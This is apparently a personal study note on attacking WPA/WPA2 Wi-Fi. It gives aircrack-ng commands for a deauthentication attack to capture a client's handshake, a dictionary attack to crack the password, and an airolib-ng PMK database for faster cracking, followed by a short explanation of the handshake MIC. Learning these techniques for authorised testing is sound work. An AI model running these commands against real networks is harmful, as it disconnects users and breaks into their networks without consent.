# WPA/WPA2 Attacks

Start airmon-ng and airodump-ng and output it to &lt;airodump-output.cap&gt; 

### 1. De-authentication attack

Using de-auth attack knocks off the client from the wifi and when it attempts to be reconnected a 4-way handshake will be captured. This can be used by aircrack-ng to find the password by dictionary attack

```bash
aireplay-ng -0 1 -a <AP-mac-addr> -c <Victim-mac-addr> mon0
```

When client reconnects, you will see the top right of airodump-ng screen indicates that handshake is now captured.

If you use wireshark to check the contents of packets &lt;output.cap&gt;. Filter the contents of the cap file by using "EAPOL" and observe that the 4-way handshake is captured.

```text
wireshark <output.cap>
```

### 2. Aircrack-ng to discover WPA password

```bash
aircrack-ng -0 -w <wordlist> <airodump-output.cap>
```



## Airolib-ng - creating PMK database for faster cracking

```bash
# add my ESSD into a text fiole
echo WIFU > essid.txt

# create database of PMK
airolib-ng my_password_db --import essid essid.txt 

# shows 0 passwords
airolib-ng my_password_db --stats

# import password list to database
airolib-ng my_password_db --import passwd /usr/share/wordlists/myWordl.txt

# batch calculate PMK 
airolib-ng my_password_db --batch
```

## Info: How WPA passwords are "cracked"?

There are 2 things needed to crack WPA password. \(1\) handshake \(2\) wordlist

In short, the Handshake is made up of the Password + the following "ingredients": 

* **SP Address**
* **STA Address**
* **AP Nonce**
* **STA Nonce**
* **EAPOL**
* **Payload**

Which generates a **MIC \(Message integrity code**\). Now this value changes if the "ingredients" including the Password value changes. 

To crack the Password, the attack is basically taking each word form the wordlists we provide and cook it with the "ingredients" to see if the MIC matches the one with the rightful password.







